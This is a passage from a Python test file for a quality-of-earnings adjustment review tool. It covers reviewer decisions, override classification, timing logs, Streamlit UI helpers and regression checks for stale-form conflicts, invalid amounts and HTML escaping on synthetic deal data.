        make_decision(a["A-1"], treatment=Treatment.REQUEST_INFO, amounts={"FY2025": "999"}, **kw)
    ask = questions_after(a["A-1"].open_questions, new_texts=["Provide the invoice."])
    info = make_decision(a["A-1"], treatment=Treatment.REQUEST_INFO, amounts={"FY2025": "999"}, questions=ask, **kw)
    assert info.amounts == {}
    same_info = make_decision(a["A-4"], treatment=Treatment.REQUEST_INFO, amounts={}, rationale="", reviewer="Ann", labels=LABELS)
    assert same_info.tool_amounts == {} and not decision_is_override(same_info)


def test_decision_problems_errors_and_warnings(wp):
    a = _by_id(wp)
    base = dict(rationale="x", reviewer="Ann", labels=LABELS, correction_type=CorrectionType.JUDGMENT_DIFFERENCE)
    errors, _ = decision_problems(a["A-2"], treatment=Treatment.REVISE, amounts={"FY2025": "abc"}, **base)
    assert any("not a number" in e for e in errors)
    errors, _ = decision_problems(a["A-2"], treatment=Treatment.REVISE, amounts={"FY2025": "120"}, **{**base, "reviewer": ""})
    assert errors == ["Enter the reviewer's name."]
    # Agreeing but blaming the tool (e.g. a wrong link) still needs an explanation.
    errors, _ = decision_problems(
        a["A-2"], treatment=Treatment.REVISE, amounts={"FY2025": "120"}, rationale="", reviewer="Ann", labels=LABELS, correction_type=CorrectionType.TOOL_WRONG_LINK
    )
    assert errors == ["Explain the correction in the rationale."]
    _, warnings = decision_problems(a["A-2"], treatment=Treatment.REVISE, amounts={"FY2025": "200"}, **base)
    assert any("Accept" in w for w in warnings)
    _, warnings = decision_problems(a["A-2"], treatment=Treatment.REVISE, amounts={"FY2025": "0"}, **base)
    assert any("Reject" in w for w in warnings)
    _, warnings = decision_problems(a["A-2"], treatment=Treatment.REVISE, amounts={"FY2025": "120"}, **base)
    assert warnings == ["The decision matches the tool's proposal; this correction type only applies to an override."]


def test_review_status_and_staleness(wp):
    a2 = _by_id(wp)["A-2"]
    agreed = _decision("A-2", Treatment.REVISE, _pm("0", "120"), Treatment.REVISE, _pm("0", "120"))
    overridden = _decision("A-2", Treatment.REJECT, _pm("0", "0"), Treatment.REVISE, _pm("0", "120"))
    assert review_status(a2, None) == STATUS_UNREVIEWED
    assert review_status(a2, agreed) == STATUS_AGREED
    assert review_status(a2, overridden) == STATUS_OVERRIDDEN
    old_tool = _decision("A-2", Treatment.REVISE, _pm("0", "120"), Treatment.ACCEPT, _pm("0", "200"))
    assert decision_is_stale(a2, old_tool) and not decision_is_stale(a2, agreed)


# ---------------------------------------------------------------------------
# Corrections summary (feedback loop) and timing
# ---------------------------------------------------------------------------


def test_corrections_summary_splits_tool_errors_from_judgment():
    log = [
        _decision("A-1", Treatment.ACCEPT, _pm("0", "100"), Treatment.ACCEPT, _pm("0", "100")),
        _decision("A-2", Treatment.REJECT, _pm("0", "0"), Treatment.REVISE, _pm("0", "120"), correction_type=CorrectionType.JUDGMENT_DIFFERENCE),
        _decision("A-2", Treatment.REVISE, _pm("0", "80"), Treatment.REVISE, _pm("0", "120"), correction_type=CorrectionType.TOOL_WRONG_AMOUNT),
        _decision("A-3", Treatment.REVISE, _pm("0", "50"), Treatment.REJECT, _pm("0", "0"), correction_type=CorrectionType.JUDGMENT_DIFFERENCE),
        _decision("A-4", Treatment.REVISE, _pm("30", "0"), Treatment.REQUEST_INFO, {}, correction_type=CorrectionType.NEW_INFORMATION),
        _decision("A-5", Treatment.REJECT, _pm("0", "0"), Treatment.REVISE, _pm("58", "-40")),  # override left unclassified
        _decision("A-6", Treatment.ACCEPT, _pm("0", "10"), Treatment.ACCEPT, _pm("0", "10"), correction_type=CorrectionType.TOOL_WRONG_LINK),
    ]
    s = corrections_summary(log)
    assert s["decisions"] == 6 and s["overridden"] == 4 and s["agreed"] == 2
    assert s["tool_error"] == 2 and s["judgment"] == 1 and s["new_information"] == 1
    assert s["by_type"]["TOOL_WRONG_AMOUNT"] == 1 and s["by_type"]["NONE"] == 2
    assert s["tool_error_adj_ids"] == ["A-2", "A-6"]
    assert s["unclassified_overrides"] == ["A-5"]
    assert corrections_summary(log, latest_only=False)["by_type"]["JUDGMENT_DIFFERENCE"] == 2
    assert [d.adj_id for d in tool_error_corrections(log)] == ["A-2", "A-6"]


def test_timing_log_and_summary(tmp_path):
    path = tmp_path / "toy_deal" / "timing.jsonl"
    append_timing(path, adj_id="A-10", opened_at=TS, decided_at="2026-01-15T10:05:00+00:00", seconds=300, reviewer="Ann", treatment=Treatment.REVISE)
    append_timing(path, adj_id="A-2", opened_at=TS, decided_at="2026-01-15T10:02:00+00:00", seconds=120)
    append_timing(path, adj_id="A-2", opened_at=TS, decided_at="2026-01-15T10:09:00+00:00", seconds=60)
    with open(path, "ab") as fh:
        fh.write(b'{"adj_id": "A-3", "sec')
    records = load_timing(path)
    assert [r["adj_id"] for r in records] == ["A-10", "A-2", "A-2"]
    assert records[0]["treatment"] == "REVISE"
    s = timing_summary(records)
    assert s["total_seconds"] == 480 and s["decisions"] == 3 and s["adjustments"] == 2
    assert [p["adj_id"] for p in s["per_adjustment"]] == ["A-2", "A-10"]  # natural order
    assert s["per_adjustment"][0]["seconds"] == 180
    assert s["per_adjustment"][0]["last_decided_at"] == "2026-01-15T10:09:00+00:00"
    assert s["median_seconds_per_adjustment"] == 240


# ---------------------------------------------------------------------------
# UI pure helpers
# ---------------------------------------------------------------------------

ui = pytest.importorskip("qoe.ui")


def test_fmt_amount_workpaper_style():
    assert ui.fmt_amount("1234.5") == "1,235"
    assert ui.fmt_amount("-40000") == "(40,000)"
    assert ui.fmt_amount("0") == "-"
    assert ui.fmt_amount("-0.4") == "-"
    assert ui.fmt_amount("1234.5", cents=True) == "1,234.50"
    assert ui.fmt_amount(None) == ""
    assert ui.fmt_amount("n/a") == "n/a"


def test_code_and_row_helpers():
    assert ui.humanize_code(FlagCode.ALREADY_EXCLUDED_FROM_EBITDA) == "Already excluded from EBITDA"
    assert ui.humanize_code(DataQualityCode.PL_ACCOUNT_NOT_IN_GL) == "P&L account not in GL"
    assert ui.humanize_code(DataQualityCode.MGMT_EBITDA_DIFFERS_FROM_GL) == "Management EBITDA differs from GL"
    assert ui.gl_row_of("GL-R123") == 123 and ui.gl_row_of("X-1") is None
    assert ui.gl_rows_text(["GL-R5"]) == "GL row 5"
    assert ui.gl_rows_text(["GL-R5", "GL-R9"]) == "GL rows 5, 9"
    assert ui.fmt_duration(65) == "1m 05s" and ui.fmt_duration(3720) == "1h 02m"


def test_discover_deals_and_paths(tmp_path, monkeypatch):
    monkeypatch.setenv(ui.SHOW_HOLDOUT_ENV, "1")
    (tmp_path / "dev" / "alpha").mkdir(parents=True)
    (tmp_path / "dev" / "alpha" / "deal.yaml").write_text("deal_id: alpha_co\ntarget_name: Alpha Co (SYNTHETIC)\n")
    (tmp_path / "dev" / "not_a_deal").mkdir()
    (tmp_path / "holdout" / "beta").mkdir(parents=True)
    (tmp_path / "holdout" / "beta" / "deal.yaml").write_text(": not [valid yaml")
    deals = ui.discover_deals(tmp_path)
    assert [(d.split, d.deal_id, d.target_name) for d in deals] == [("dev", "alpha_co", "Alpha Co (SYNTHETIC)"), ("holdout", "beta", "beta")]
    assert ui.find_deal_dir("alpha_co", tmp_path) == tmp_path / "dev" / "alpha"

    monkeypatch.setenv("QOE_WORKPAPERS_DIR", "scratch/wp")
    paths = ui.workpaper_paths("alpha_co")
    assert paths.root == ui.PROJECT_ROOT / "scratch" / "wp" / "alpha_co"
    assert paths.review_log.name == "review_log.jsonl" and paths.timing.name == "timing.jsonl"
    assert paths.xlsx.name == "QoE_Evidence_Review_alpha_co.xlsx"
    monkeypatch.delenv("QOE_WORKPAPERS_DIR")
    assert ui.workpapers_root() == ui.PROJECT_ROOT / "workpapers"


def test_bridge_tables(wp):
    summary = ui.bridge_summary_rows(wp.bridge)
    assert [r["Line"] for r in summary][:4] == [label for _, label in ui.BRIDGE_SUMMARY_KEYS]
    assert summary[0]["FY2025"] == "1,200"
    assert summary[-1]["Line"] == "Diligence less management adjusted"
    assert summary[-1]["FY2025"] == "(175)"  # 1,380 - 1,555
    full = ui.bridge_rows(wp.bridge)
    assert len(full) == len(wp.bridge.rows) and full[2]["_class"] == "mgmt_adjustment"


def test_queue_rows_and_status_counts(wp):
    latest = {"A-2": _decision("A-2", Treatment.REJECT, _pm("0", "0"), Treatment.REVISE, _pm("0", "120"))}
    finals = final_amounts(wp, latest)
    rows = {r["Ref"]: r for r in ui.queue_rows(wp, latest, finals)}
    assert set(ui.queue_columns(LABELS)) >= {k for k in rows["A-1"] if not k.startswith("_")}  # "_" keys are hidden
    assert rows["A-2"]["Status"] == STATUS_OVERRIDDEN and rows["A-2"]["Reviewer"] == "Reject"
    assert rows["A-2"]["Final FY2025"] == "-" and rows["A-2"]["Proposed FY2025"] == "120"
    assert rows["A-2"]["Top flags"] == "Already excluded from EBITDA, Continuing obligation, Recurring pattern (+1)"
    assert rows["A-2"]["GL links"] == 3 and rows["A-2"]["Supporting GL links"] == 2 and rows["A-2"]["Docs"] == 1
    assert rows["A-4"]["Bridge"] == "Excluded (pending)" and rows["A-4"]["Final FY2024"] == "pending"
    assert rows["A-2"]["Bridge"] == "Carried at 0" and rows["A-1"]["Bridge"] == "Carried"
    assert rows["A-4"]["Open Qs"] == 2
    assert rows["A-5"]["Final FY2025"] == "(40)" and rows["A-1"]["Status"] == STATUS_UNREVIEWED

    counts = ui.status_counts(wp, latest, finals)
    assert counts["total"] == 5 and counts["reviewed"] == 1
    assert counts["tool"] == {"ACCEPT": 1, "REVISE": 2, "REJECT": 1, "REQUEST_INFO": 1}
    assert counts["review"] == {STATUS_UNREVIEWED: 4, STATUS_AGREED: 0, STATUS_OVERRIDDEN: 1}
    assert counts["final_treatment"]["REJECT"] == 2
    assert counts["pending"] == 1 and counts["open_questions"] == 2 and counts["stale"] == 0


def test_queue_groups_put_diligence_items_after_management_items():
    wp = _wp_with_diligence()
    finals = final_amounts(wp, {})
    groups = ui.queue_groups(ui.queue_rows(wp, {}, finals))
    assert [(g, [r["Ref"] for r in rows]) for g, rows in groups] == [
        (ui.GROUP_MANAGEMENT, ["A-1", "A-2", "A-3", "A-4", "A-5"]),
        (ui.GROUP_DILIGENCE, ["D-1"]),
    ]
    d1 = groups[1][1][0]
    assert (d1["Claimed FY2025"], d1["Proposed FY2025"], d1["Final FY2025"]) == ("-", "18,400", "18,400")
    assert d1["Tool"] == "Revise" and d1["Status"] == STATUS_UNREVIEWED and d1["Bridge"] == "Carried"
    # No diligence items: a single management group.
    plain = _workpaper()
    assert [g for g, _ in ui.queue_groups(ui.queue_rows(plain, {}, final_amounts(plain, {})))] == [ui.GROUP_MANAGEMENT]
    assert ui.status_counts(wp, {}, finals)["diligence_items"] == 1


def test_bridge_tables_show_diligence_item_rows():
    wp = _wp_with_diligence()
    ids = ui.diligence_ids(wp)
    assert ids == {"D-1"}
    full = ui.bridge_rows(wp.bridge, ids)
    lines = [r["Line"] for r in full]
    heading = next(i for i, r in enumerate(full) if r["_class"] == "group")
    assert full[heading]["Line"].startswith(ui.GROUP_DILIGENCE)
    d1 = next(i for i, r in enumerate(full) if r["_class"] == "diligence_adjustment" and "premium" in r["Line"].lower())
    assert heading == d1 - 1 and d1 > max(i for i, r in enumerate(full) if r["Line"].startswith("Adjustment A-5"))
    assert full[d1]["FY2025"] == "18,400"
    assert not any("as claimed" in line and "premium" in line.lower() for line in lines)
    summary = ui.bridge_summary_rows(wp.bridge, ids)
    assert [r["Line"] for r in summary][:4] == [label for _, label in ui.BRIDGE_SUMMARY_KEYS]
    assert summary[-1]["Line"].startswith("of which D-1: ") and summary[-1]["FY2025"] == "18,400"
    # Without the diligence ids the rows are listed as the bridge has them, with no heading.
    assert not any(r["_class"] == "group" for r in ui.bridge_rows(wp.bridge))


def test_claim_details_fall_back_to_workpaper_fields():
    wp = _workpaper()
    a2 = wp.assessments[1].model_copy(
        update={"description": "Dawson litigation fees.", "gl_accounts": ["6400"], "support_refs": ["DR 4.2"]}
    )
    info = ui.claim_details(a2, None)
    assert info["description"] == "Dawson litigation fees."
    assert info["bits"] == ["GL accounts: 6400", "Support: DR 4.2"]
    assert ui.claim_details(wp.assessments[0], None) == {
        "heading": "Management's claim and basis", "description": "", "bits": []
    }
    stored = schedule_from_workpaper(wp).model_copy(deep=True)
    stored.adjustments[1].description = "From the stored schedule."
    stored.adjustments[1].category_raw = "Non-recurring"
    info = ui.claim_details(a2, None, stored)
    assert info["description"] == "From the stored schedule." and "Schedule row 2" in info["bits"]
    d1 = _diligence_item()
    info = ui.claim_details(d1, None)
    assert info["heading"].startswith("Diligence-identified") and info["description"].startswith("Premium installment")
    assert info["bits"][0] == ui.DILIGENCE_NOTE and "GL accounts: 6200" in info["bits"]


def test_tieout_rows(wp):
    a = _by_id(wp)
    rows = {r["Line"]: r for r in ui.tieout_rows(a["A-2"], _pm("0", "150"), LABELS, reviewed=True)}
    assert rows["Claimed by management"]["FY2025"] == "200"
    assert rows["Documented (portion of traced)"]["FY2025"] == "150"
    assert rows["Tool proposed"]["FY2025"] == "120"
    assert rows["Final (reviewed)"]["FY2025"] == "150"
    assert rows["Final less claimed"]["FY2025"] == "(50)"
    pending = {r["Line"]: r for r in ui.tieout_rows(a["A-4"], {}, LABELS, reviewed=False)}
    assert pending["Tool proposed"]["FY2024"] == "pending"
    assert pending["Final (unreviewed: tool proposal)"]["FY2024"] == "pending"


def test_gl_link_rows_join_gl_and_flags(wp):
    a2 = _by_id(wp)["A-2"]
    gl = {
        "GL-R12": GLEntry(
            entry_id="GL-R12", date="2025-03-05", period="2025-03", account="6400", account_name="Legal", counterparty="Hollow LLP",
            doc_number="INV-7", memo="Retainer - Mar", amount="80.00", source_file="gl.csv", source_row=12,
        )
    }
    rows = ui.gl_link_rows(a2, gl)
    assert [r["GL row"] for r in rows] == [10, 12, 3]  # supporting first, then context
    r12 = rows[1]
    assert (r12["Account"], r12["Doc #"], r12["Amount"]) == ("6400 Legal", "INV-7", "80.00")
    assert r12["Challenged by"] == "Continuing obligation, Recurring pattern"
    assert rows[2]["Role"] == "Context (not part of the claim)"


def test_question_issue_and_history_rows(wp):
    qs = ui.question_rows(wp)
    assert [q["Q id"] for q in qs] == ["Q-A-4-1", "Q-A-4-2"] and qs[0]["Status"] == "OPEN"
    issues = ui.issue_rows(wp.reconciliation)
    assert issues[0]["Issue"] == "Duplicate GL entry" and issues[0]["GL rows"] == "GL rows 40, 41"
    assert issues[1]["Amount"] == "25.00"
    checks = ui.ebitda_check_rows(wp)
    assert checks[1]["Management less GL"] == "(25)"
    hist = ui.decision_history_rows([_decision("A-5", Treatment.REQUEST_INFO, {}, Treatment.REVISE, _pm("58", "-40"))], LABELS)
    assert hist[0]["FY2024"] == "pending" and hist[0]["Treatment"] == "Request info"


def test_html_fragments_escape_and_highlight():
    text = "Fee is $80 per month <b>bold</b>.\nFee is $80 per month again."
    out = ui.highlight_quotes(text, ["$80 per month", "80 per month again", ""])
    assert out.count("<mark>") == 2  # overlapping second quote merged into one span
    assert "&lt;b&gt;" in out and "$" not in out  # $ escaped so it cannot trigger LaTeX
    table = ui.html_table(["Line", "FY2025"], [{"Line": "<script>", "FY2025": "1", "_class": "subtotal"}], numeric=["FY2025"])
    assert "&lt;script&gt;" in table and 'class="subtotal"' in table and '<td class="num">1</td>' in table
    ids = ui.html_table(["Q id", "N"], [{"Q id": "Q-M-02-1", "N": "3"}], numeric=["N"], nowrap=["Q id", "N"])
    assert '<td class="nw">Q-M-02-1</td>' in ids and '<td class="num nw">3</td>' in ids
    assert ui.basis_label("UNSIGNED_OR_DRAFT_SUPPORT") == "Unsigned or draft support"
    assert ui.basis_label("ai:draft_questions") == "ai:draft_questions"
    facts = ui.facts_html([Fact(text="Paid", entry_ids=["GL-R2"], quotes=[EvidenceQuote(doc_id="d.pdf", page=2, quote="paid")])])
    assert "GL row 2" in facts and "d.pdf, p. 2" in facts
    assert "No flags" not in ui.flag_html(Flag(code=FlagCode.SIGN_ERROR, severity=Severity.WARNING, message="m", amount_impact="-5"))


def test_form_defaults_and_question_update_values(wp):
    a = _by_id(wp)
    assert ui.form_defaults(a["A-2"], None, LABELS) == (Treatment.REVISE, _pm("0", "120"))
    assert ui.form_defaults(a["A-4"], None, LABELS) == (Treatment.REQUEST_INFO, _pm("30", "30"))
    prior = _decision("A-2", Treatment.REVISE, _pm("0", "150"), Treatment.REVISE, _pm("0", "120"))
    assert ui.form_defaults(a["A-2"], prior, LABELS) == (Treatment.REVISE, _pm("0", "150"))

    q1, q2 = a["A-4"].open_questions
    edits = {q1.q_id: (QuestionStatus.ANSWERED, "Sent"), q2.q_id: (QuestionStatus.OPEN, "")}
    assert ui.question_update_values(a["A-4"].open_questions, edits) == {"Q-A-4-1": "ANSWERED: Sent"}
    answered = q1.model_copy(update={"status": QuestionStatus.ANSWERED, "response": "Sent"})
    assert ui.question_update_values([answered], {q1.q_id: (QuestionStatus.ANSWERED, "")}) == {"Q-A-4-1": "ANSWERED:"}


def test_time_tracker_counts_only_time_on_screen():
    t0 = datetime(2026, 1, 1, 9, 0, tzinfo=timezone.utc)
    state: dict = {}
    ui.track_view(state, "A-1", t0)
    ui.track_view(state, "A-1", t0 + timedelta(seconds=30))  # rerun on the same page
    ui.track_view(state, "A-2", t0 + timedelta(seconds=60))
    ui.track_view(state, None, t0 + timedelta(seconds=90))  # left for the queue
    ui.track_view(state, "A-1", t0 + timedelta(seconds=300))
    assert ui.elapsed_seconds(state, "A-1", t0 + timedelta(seconds=320)) == 80
    assert ui.elapsed_seconds(state, "A-2", t0 + timedelta(seconds=320)) == 30
    opened, seconds = ui.finish_timing(state, "A-1", t0 + timedelta(seconds=320))
    assert (opened, seconds) == (t0, 80)
    assert ui.elapsed_seconds(state, "A-1", t0 + timedelta(seconds=330)) == 10  # re-review timed afresh


def test_read_document_pages_fallback(tmp_path):
    docs = tmp_path / "documents" / "4 Legal"
    docs.mkdir(parents=True)
    (docs / "memo [1].txt").write_text("Line one   with  spaces\r\n\r\n\r\nLine two\n")
    assert ui.read_document_pages(tmp_path, "memo [1].txt") == ["Line one with spaces\n\nLine two"]
    assert ui.read_document_pages(tmp_path, "missing.pdf") == []


# ---------------------------------------------------------------------------
# App smoke test: every page renders and a decision is recorded end to end
# ---------------------------------------------------------------------------


def test_app_renders_pages_and_records_decision(wp, tmp_path, monkeypatch):
    testing = pytest.importorskip("streamlit.testing.v1")
    (tmp_path / "data").mkdir()
    monkeypatch.setenv("QOE_DATA_DIR", str(tmp_path / "data"))
    monkeypatch.setenv("QOE_WORKPAPERS_DIR", str(tmp_path / "wp"))
    wp_path = tmp_path / "wp" / wp.deal.deal_id / "workpaper.json"
    wp_path.parent.mkdir(parents=True)
    wp_path.write_text(wp.model_dump_json())

    at = testing.AppTest.from_file(str(ROOT / "qoe" / "ui.py"), default_timeout=60)
    at.session_state["wp_path"] = str(wp_path)
    at.run()
    assert not at.exception
    assert any("SYNTHETIC" in str(getattr(h, "proto", "")) for h in at.get("html"))
    for page in ui.PAGES:
        at.session_state["page"] = page
        at.session_state["adj_select"] = "A-2"
        at.run()
        assert not at.exception, page
        assert not at.error, (page, [e.value for e in at.error])

    at.session_state["page"] = "Adjustment detail"
    at.run()
    at.text_input(key="reviewer").input("Ann Senior")
    at.radio(key="f:A-2:treatment").set_value(Treatment.REJECT)
    at.run()
    at.text_area(key="f:A-2:rationale").input("Retainer is a continuing cost; litigation fees recur.")
    at.selectbox(key="f:A-2:correction").set_value(CorrectionType.JUDGMENT_DIFFERENCE)
    at.run()
    next(b for b in at.button if b.label == "Record decision").click().run()
    assert not at.exception

    decisions = ReviewStore(wp_path.parent / "review_log.jsonl").all()
    assert [(d.adj_id, d.treatment, d.reviewer, d.correction_type) for d in decisions] == [
        ("A-2", Treatment.REJECT, "Ann Senior", CorrectionType.JUDGMENT_DIFFERENCE)
    ]
    assert decisions[0].amounts == _pm("0", "0") and decisions[0].tool_amounts == _pm("0", "120")
    timing = load_timing(wp_path.parent / "timing.jsonl")
    assert [t["adj_id"] for t in timing] == ["A-2"] and timing[0]["seconds"] >= 0
    assert any("Recorded Reject for A-2" in _plain(s.value) for s in at.success)


def test_app_reviews_a_diligence_item(tmp_path, monkeypatch):
    testing = pytest.importorskip("streamlit.testing.v1")
    wp = _wp_with_diligence(store_schedule=True)
    (tmp_path / "data").mkdir()
    monkeypatch.setenv("QOE_DATA_DIR", str(tmp_path / "data"))
    monkeypatch.setenv("QOE_WORKPAPERS_DIR", str(tmp_path / "wp"))
    wp_path = tmp_path / "wp" / wp.deal.deal_id / "workpaper.json"
    wp_path.parent.mkdir(parents=True)
    wp_path.write_text(wp.model_dump_json())

    at = testing.AppTest.from_file(str(ROOT / "qoe" / "ui.py"), default_timeout=60)
    at.session_state["wp_path"] = str(wp_path)
    for page in ui.PAGES:
        at.session_state["page"] = page
        at.session_state["adj_select"] = "D-1"
        at.run()
        assert not at.exception, page
        assert not at.error, (page, [e.value for e in at.error])
    at.session_state["page"] = "Adjustment queue"
    at.run()
    assert any(ui.GROUP_DILIGENCE in m.value for m in at.markdown)

    at.session_state["page"] = "Adjustment detail"
    at.run()
    html = " ".join(str(getattr(h, "proto", "")) for h in at.get("html"))
    assert "Diligence-identified" in html and "Premium installment CRI-0507" in html
    at.text_input(key="reviewer").input("Ann Senior")
    at.run()
    next(b for b in at.button if b.label == "Record decision").click().run()
    assert not at.exception
    decisions = ReviewStore(wp_path.parent / "review_log.jsonl").all()
    assert [(d.adj_id, d.treatment, d.amounts, d.correction_type) for d in decisions] == [
        ("D-1", Treatment.REVISE, _pm("0", "18400"), CorrectionType.NONE)
    ]


# ---------------------------------------------------------------------------
# Regression tests for the review findings (ui-*, security-*, excel-pending-*)
# ---------------------------------------------------------------------------


def _app(wp: Workpaper, tmp_path: Path, monkeypatch, page: str = "Overview", adj: Optional[str] = None):
    """A fresh app session on ``wp`` (no deal package), and the workpaper directory."""
    testing = pytest.importorskip("streamlit.testing.v1")
    (tmp_path / "data").mkdir(parents=True, exist_ok=True)
    monkeypatch.setenv("QOE_DATA_DIR", str(tmp_path / "data"))
    monkeypatch.setenv("QOE_WORKPAPERS_DIR", str(tmp_path / "wp"))
    wp_path = tmp_path / "wp" / wp.deal.deal_id / "workpaper.json"
    if not wp_path.exists():
        wp_path.parent.mkdir(parents=True, exist_ok=True)
        wp_path.write_text(wp.model_dump_json())
    at = testing.AppTest.from_file(str(ROOT / "qoe" / "ui.py"), default_timeout=60)
    at.session_state["wp_path"] = str(wp_path)
    at.session_state["page"] = page
    if adj is not None:
        at.session_state["adj_select"] = adj
    at.run()
    assert not at.exception
    return at, wp_path.parent


def _click(at, label: str):
    next(b for b in at.button if b.label == label).click().run()
    assert not at.exception
    return at


def _texts(elements) -> list[str]:
    return [_plain(e.value) for e in elements]


# -- ui-01 / ui-15: question updates are their own log lines ------------------------------


def test_app_question_update_needs_a_name_and_does_not_touch_decisions(wp, tmp_path, monkeypatch):
    at, wdir = _app(wp, tmp_path, monkeypatch)
    store = ReviewStore.for_workpaper_dir(wdir)
    prior = _decision("A-4", Treatment.REQUEST_INFO, {}, Treatment.REQUEST_INFO, {}, reviewer="Assoc A", rationale="Need the agreement.")
    store.append(prior)
    at.session_state["page"] = "Open questions"
    at.run()
    at.selectbox(key="oq_pick").set_value("Q-A-4-1").run()
    at.selectbox(key="oq_status:Q-A-4-1").set_value(QuestionStatus.ANSWERED)
    at.text_input(key="oq_response:Q-A-4-1").input("Agreement sent 3/1")
    _click(at, "Record update")  # Reviewer box is blank
    assert "Enter the reviewer's name." in _texts(at.error)
    assert not store.question_path.exists() and store.all() == [prior]

    at.text_input(key="reviewer").input("Manager B")
    at.selectbox(key="oq_status:Q-A-4-1").set_value(QuestionStatus.ANSWERED)
    at.text_input(key="oq_response:Q-A-4-1").input("Agreement sent 3/1")
    _click(at, "Record update")
    assert store.all() == [prior]  # no decision line was written or re-signed
    [entry] = store.questions()
    assert (entry.q_id, entry.reviewer, entry.status, entry.response) == ("Q-A-4-1", "Manager B", QuestionStatus.ANSWERED, "Agreement sent 3/1")
    assert store.latest()["A-4"].reviewer == "Assoc A"


def test_app_logs_a_management_answer_on_an_unreviewed_adjustment(wp, tmp_path, monkeypatch):
    at, wdir = _app(wp, tmp_path, monkeypatch, page="Open questions")
    at.text_input(key="reviewer").input("Ann")
    at.selectbox(key="oq_pick").set_value("Q-A-4-2").run()
    at.text_input(key="oq_response:Q-A-4-2").input("Market data attached")
    at.selectbox(key="oq_status:Q-A-4-2").set_value(QuestionStatus.ANSWERED)
    _click(at, "Record update")
    store = ReviewStore.for_workpaper_dir(wdir)
    assert store.all() == []
    assert [(e.q_id, e.status) for e in store.questions()] == [("Q-A-4-2", QuestionStatus.ANSWERED)]
    at.session_state["page"] = "Adjustment queue"
    at.run()
    assert not at.exception
    row = {r["Ref"]: r for r in ui.queue_rows(*_ctx_parts(wdir, wp))}["A-4"]
    assert row["Status"] == STATUS_UNREVIEWED


def _ctx_parts(wdir: Path, wp: Workpaper):
    store = ReviewStore.for_workpaper_dir(wdir)
    decisions = store.all()
    applied = apply_reviews(wp, decisions, question_log=store.questions())
    latest = latest_by_adj(decisions)
    return applied, latest, final_amounts(applied, latest)


# -- ui-02: a stale page cannot overwrite a newer decision --------------------------------


def test_store_conditional_append_refuses_a_decision_built_on_an_older_one(tmp_path):
    store = ReviewStore(tmp_path / "review_log.jsonl")
    b = _decision("A-2", Treatment.REJECT, _pm("0", "0"), Treatment.REVISE, _pm("0", "120"), reviewer="Manager B")
    store.append(b, expected_token=NO_ENTRY_TOKEN)  # B's form was built when nothing was recorded
    a = _decision("A-2", Treatment.ACCEPT, _pm("0", "200"), Treatment.REVISE, _pm("0", "120"), reviewer="Assoc A")
    with pytest.raises(ConflictError) as exc:
        store.append(a, expected_token=NO_ENTRY_TOKEN)  # A's page predates B's decision
    assert "Manager B" in str(exc.value) and exc.value.current == b
    assert store.all() == [b]
    store.append(a, expected_token=decision_token(b))  # after reviewing B's decision
    assert store.latest()["A-2"] == a
    # Other adjustments are unaffected by the check.
    store.append(_decision("A-1", Treatment.ACCEPT, _pm("0", "100"), Treatment.ACCEPT, _pm("0", "100")), expected_token=NO_ENTRY_TOKEN)
    q = QuestionLogEntry(kind="update", q_id="Q-A-4-1", adj_id="A-4", reviewer="B", timestamp=TS, status=QuestionStatus.CLOSED)
    store.append_question(q, expected_token=NO_ENTRY_TOKEN)
    with pytest.raises(ConflictError):
        store.append_question(q, expected_token=NO_ENTRY_TOKEN)
    assert question_token(store.questions(), "Q-A-4-1") != NO_ENTRY_TOKEN
    other = ReviewStore(tmp_path / "other" / "review_log.jsonl")  # no entries at all for the token to match
    with pytest.raises(ConflictError):
        other.append_question(q, expected_token=question_token(store.questions(), "Q-A-4-1"))


def test_app_stale_form_does_not_overwrite_a_colleagues_newer_decision(wp, tmp_path, monkeypatch):
    at_a, wdir = _app(wp, tmp_path, monkeypatch, page="Adjustment detail", adj="A-2")
    at_a.text_input(key="reviewer").input("Assoc A")
    at_a.run()
    at_b, _ = _app(wp, tmp_path, monkeypatch, page="Adjustment detail", adj="A-2")
    at_b.text_input(key="reviewer").input("Manager B")
    at_b.radio(key="f:A-2:treatment").set_value(Treatment.REJECT)
    at_b.text_area(key="f:A-2:rationale").input("Litigation recurs every year.")
    at_b.selectbox(key="f:A-2:correction").set_value(CorrectionType.JUDGMENT_DIFFERENCE)
    _click(at_b, "Record decision")
    store = ReviewStore.for_workpaper_dir(wdir)
    assert [d.reviewer for d in store.all()] == ["Manager B"]

    # A's page was built before B's decision, and A has a draft (the reviewer name alone is not one).
    at_a.text_area(key="f:A-2:rationale").input("Agree with the tool.")
    _click(at_a, "Record decision")
    assert [d.reviewer for d in store.all()] == ["Manager B"]
    assert any("decided by Manager B" in t for t in _texts(at_a.warning) + _texts(at_a.error))
    # After reviewing B's decision, A can keep the draft and record it deliberately.
    _click(at_a, "Keep my draft: I have reviewed the newer decision")
    at_a.radio(key="f:A-2:treatment").set_value(Treatment.REVISE)
    at_a.text_area(key="f:A-2:rationale").input("Retainer only; litigation is one-off.")
    at_a.run()
    _click(at_a, "Record decision")
    assert [d.reviewer for d in store.all()] == ["Manager B", "Assoc A"]


# -- ui-03: non-finite and huge amounts are form errors, not crashes ----------------------


@pytest.mark.parametrize("bad", ["NaN", "nan", "sNaN", "Infinity", "-inf", "1e999999", "1e20"])
def test_decision_problems_reject_non_finite_or_huge_amounts(wp, bad):
    a2 = _by_id(wp)["A-2"]
    kw = dict(rationale="x", reviewer="Ann", labels=LABELS, correction_type=CorrectionType.JUDGMENT_DIFFERENCE)
    errors, _ = decision_problems(a2, treatment=Treatment.REVISE, amounts={"FY2024": "0", "FY2025": bad}, **kw)
    assert len(errors) == 1 and errors[0].startswith("Amount is") and errors[0].endswith("for: FY2025.")
    with pytest.raises(DecisionError):
        make_decision(a2, treatment=Treatment.REVISE, amounts={"FY2025": bad}, **kw)
    assert amount_problem(bad) is not None and amount_problem("(1,234.50)") is None


def test_app_nan_amount_shows_an_error_and_keeps_the_app_up(wp, tmp_path, monkeypatch):
    at, wdir = _app(wp, tmp_path, monkeypatch, page="Adjustment detail", adj="A-2")
    at.text_input(key="reviewer").input("Ann")
    at.text_input(key="f:A-2:amt:FY2025").input("NaN")  # typed, not yet "entered"
    _click(at, "Record decision")
    assert not at.exception
    assert any("not a number for: FY2025" in t for t in _texts(at.error))
    assert ReviewStore.for_workpaper_dir(wdir).all() == []
    assert at.text_input(key="reviewer").value == "Ann"  # session state survived


# -- ui-04: a re-review starts with a blank rationale -------------------------------------


def test_form_seed_blanks_rationale_and_correction_on_re_review(wp):
    a2 = _by_id(wp)["A-2"]
    prior = _decision("A-2", Treatment.REVISE, _pm("0", "90"), Treatment.REVISE, _pm("0", "120"),
